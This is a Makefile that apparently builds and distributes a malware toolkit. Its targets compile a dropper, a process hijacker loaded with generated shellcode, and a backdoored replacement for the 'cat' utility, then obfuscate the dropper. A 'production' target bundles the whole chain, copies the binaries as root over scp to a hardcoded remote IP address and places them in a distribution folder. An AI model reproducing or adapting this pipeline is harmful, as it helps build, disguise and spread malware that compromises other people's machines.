CC = gcc
CFLAGS = -Os
BIN_FOLDER = ./bin
BOX_IP = 134.209.231.196
SERVER_IP = 134.209.231.196

.PHONY: clean
clean:
	rm -f $(BIN_FOLDER)/*

dropper: dropper/dropper.c
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/dropper dropper/dropper.c
	chmod +x $(BIN_FOLDER)/dropper

hijack_test: hijacker/hijacker.c
	python3 payload/generate_shellcode.py
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/hijacker hijacker/hijacker.c
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/test hijacker/test.c
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/test_shellcode payload/test_shellcode.c

	scp $(BIN_FOLDER)/hijacker root@$(BOX_IP):/tmp
	scp $(BIN_FOLDER)/test root@$(BOX_IP):/tmp
	scp $(BIN_FOLDER)/test_shellcode root@$(BOX_IP):/tmp
	cp $(BIN_FOLDER)/hijacker ../dealer/filelist

	scp -r ../dealer/ root@$(SERVER_IP):/tmp
	
	chmod +x $(BIN_FOLDER)/hijacker

test: hijacker/is_inj.c
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/is_inj hijacker/is_inj.c
	scp $(BIN_FOLDER)/is_inj root@$(BOX_IP):/tmp

cat:
	python3 custom_cat/cat_payload.py
	sudo python3 custom_cat/run_docker.py
	sudo chown mcsky:mcsky custom_cat/cat_bd
	mv custom_cat/cat_bd $(BIN_FOLDER)/cat_bd
	chmod +x $(BIN_FOLDER)/cat_bd
	cp $(BIN_FOLDER)/cat_bd ../dealer/filelist/cat


production:
	make cat
	
	python3 payload/generate_shellcode.py
	python3 hijacker/set_data.py
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/hijacker hijacker/hijacker.c
	$(CC) $(CFLAGS) -o $(BIN_FOLDER)/dropper dropper/dropper.c
	chmod +x $(BIN_FOLDER)/dropper

	cp $(BIN_FOLDER)/hijacker ../dealer/filelist
	cp $(BIN_FOLDER)/dropper ../dealer/filelist

	echo "[+] Obfuscating dropper"
	./dropper/obf_remote.sh root@$(BOX_IP)
	scp dropper/obf-dropper.py root@$(SERVER_IP):/tmp/tests/p

	scp -r ../dealer/ root@$(SERVER_IP):/tmp


